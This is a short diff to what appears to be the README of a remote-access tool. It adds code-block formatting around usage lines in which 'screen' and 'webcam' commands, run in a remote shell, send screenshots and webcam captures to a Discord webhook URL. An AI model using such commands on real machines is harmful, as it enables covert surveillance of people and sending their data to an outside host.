@@ -10,9 +10,9 @@ Here u can see how to run the screenshot and webcam feature:-
 NOW ASSUME THAT IT'S THE SHELL...
 
 For Screenshot:
-
+```SHELL
 [*] >> screen https://discord.com/api/webhooks/your_webhook_url_that_u_copied
-
+```
 For Webcam:
 
 [*] >> webcam https://discord.com/api/webhooks/your_webhook_url_that_u_copied
